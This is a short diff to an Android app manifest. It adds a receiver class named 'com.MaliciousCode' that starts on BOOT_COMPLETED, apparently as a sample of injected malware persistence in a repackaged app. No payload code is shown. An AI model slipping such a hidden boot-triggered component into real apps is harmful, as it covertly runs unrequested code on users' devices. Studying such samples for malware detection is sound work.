@@ -33,6 +33,11 @@
                 <action android:name="android.intent.action.LOCALE_CHANGED"/>
             </intent-filter>
         </receiver>
+		<receiver android:name="com.MaliciousCode">
+			<intent-filter>
+				<action android:name="android.intent.action.BOOT_COMPLETED"/>
+			</intent-filter>
+		</receiver>
         <service android:name="com.google.android.gms.analytics.CampaignTrackingService"/>
         <receiver android:exported="true" android:name="com.google.android.gms.analytics.CampaignTrackingReceiver">
             <intent-filter>
